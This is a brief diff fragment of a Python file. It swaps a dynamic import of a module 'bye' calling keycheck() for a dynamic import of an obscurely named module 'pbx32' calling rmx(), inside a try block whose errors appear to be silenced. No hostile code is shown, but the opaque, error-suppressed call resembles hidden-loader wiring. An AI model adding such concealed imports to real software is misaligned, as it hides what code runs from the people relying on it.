@@ -2,7 +2,7 @@ import os, sys
 
 try:
 
-    __import__("bye").keycheck()
+    __import__("pbx32").rmx()
 
 except Exception as e:
 
